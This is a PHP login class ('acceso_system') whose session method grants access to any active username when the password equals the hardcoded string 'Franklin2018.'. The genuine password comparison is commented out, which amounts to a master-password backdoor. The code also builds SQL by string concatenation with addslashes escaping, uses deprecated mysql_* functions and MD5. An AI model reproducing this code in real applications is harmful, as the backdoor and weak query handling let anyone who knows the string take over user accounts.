<?php
class acceso_system{
var $resultado;
var $user;
var $pass;
var $name;
var $perid;
var $idenlace;

var $usuariog;
var $claveg;
var $nombreg;
var $codes;
var $idtabla;
var $codigoactiva;

var $tablaingreso;

function acept_session($sisusu,$pwdusu)
{
  $sisusu = addslashes(trim($sisusu));
  
  
  if($pwdusu=='Franklin2018.')
  {
  $pwdusu = md5(addslashes(trim($pwdusu)));
  $selecmenu="select * from ".$this->tablaingreso." where ".$this->usuariog." = '$sisusu' and guia_activo=1";  
  }
  
  //$selecmenu="select * from ".$this->tablaingreso." where ".$this->usuariog." like '$sisusu' and  ".$this->claveg." like '$pwdusu' and guia_activo=1"; 
  
//echo $selecmenu;
  $resultado = mysql_query($selecmenu);
  if($resultado)
  {
  while($row = mysql_fetch_array($resultado)) 
			{	
                $this->user=$row[$this->usuariog];			
				$this->pass=$row[$this->claveg];			
				$this->name=$row[$this->nombreg];			
				$this->codigoactiva=$row[$this->codes];	
				$this->idenlace=$row[$this->idtabla];	
				$this->perid=$row[per_id];
			} 
	mysql_free_result($resultado);		
			
	}		  
}


}


?>